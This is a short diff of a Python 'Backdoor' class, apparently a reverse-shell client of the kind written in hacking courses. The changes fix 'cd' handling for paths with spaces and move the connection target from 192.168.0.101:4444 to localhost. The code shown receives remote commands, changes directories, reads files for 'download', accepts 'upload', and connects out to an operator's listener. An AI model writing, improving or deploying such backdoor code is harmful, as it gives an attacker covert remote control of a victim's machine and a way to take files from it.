@@ -61,7 +61,8 @@ class Backdoor:
                     self.connection.close()
                     exit()
                 elif command.split()[0] == "cd" and len(command) >= 2:
-                    command_result = self.change_working_directory_to(command.split()[1])
+                    path = command.replace("cd ", "")
+                    command_result = self.change_working_directory_to(path)
                 elif command.split()[0] == "download":
                     command_result = self.read_file(command.split()[1])
                 elif command.split()[0] == "upload":
@@ -88,7 +89,7 @@ class Backdoor:
                 # self.reliable_send("[-] Something was wrong!")
 
 
-my_backdoor = Backdoor("192.168.0.101", 4444)
+my_backdoor = Backdoor("localhost", 4444)
 my_backdoor.run()
 
 
